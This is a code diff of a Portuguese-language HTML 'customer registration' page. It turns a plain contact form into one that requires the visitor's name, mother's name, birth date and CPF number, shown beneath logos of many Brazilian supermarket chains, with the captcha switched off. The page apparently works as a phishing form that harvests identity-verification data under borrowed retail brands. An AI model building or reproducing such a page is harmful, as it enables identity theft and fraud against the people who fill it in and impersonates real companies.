@@ -5,6 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cadastro de Clientes</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
      <h1>Cadastro de Clientes</h1>
@@ -13,19 +14,45 @@
       method="POST"
       class="form"
     >
-      <label for="name">Nome</label>
-      <input type="text" name="name" id="name" required />
-      <label for="email">E-mail</label>
-      <input type="email" name="email" id="email" required />
-      <label for="message">Mensagem</label>
-      <textarea name="message" id="message" required></textarea>
+      <label for="nome">Seu Nome</label>
+      <input type="text" name="nome" id="nome" required />
+
+      <label for="maenome">O Nome da sua Mãe</label>
+      <input type="text" name="maenome" id="maenome" required />
+
+      <label for="datanasc">Data de Nascimento (dd/mm/aaaa)</label>
+      <input type="text" name="datanasc" id="datanasc" required />
+
+      <label for="cpf">CPF (000.000.000-00)</label>
+      <input type="text" name="cpf" id="cpf" required />
+      
       <input type="hidden" name="_captcha" value="false" />
       <input
         type="hidden"
         name="_next"
-        value="https://yourdomain.co/thanks.html"
+        value="obrigado.html"
       />
       <button type="submit">Enviar</button>
     </form>
+    <div>
+      <img src="img/assai.png">
+      <img src="img/extra.png">
+      <img src="img/atacadao.png">
+      <img src="img/big.png">
+      <img src="img/carrefour.png" style="background-color:white;">
+      <img src="img/centerbox1.png">
+      <img src="img/cometa.png" style="background-color:white;">
+      <img src="img/guara2.png">
+      <img src="img/lagoa2.png">
+      <img src="img/max.png">
+      <img src="img/paodeacucar.png" style="background-color:white;">
+      <img src="img/pinheiro1.png">
+      <img src="img/portugal.png"  style="background-color:white;">
+      <img src="img/saoluiz.png">
+      <img src="img/ismael.png">
+      <img src="img/samsclub.png">
+      <img src="img/gbarbosa.png">
+
+    </div>
 </body>
 </html>
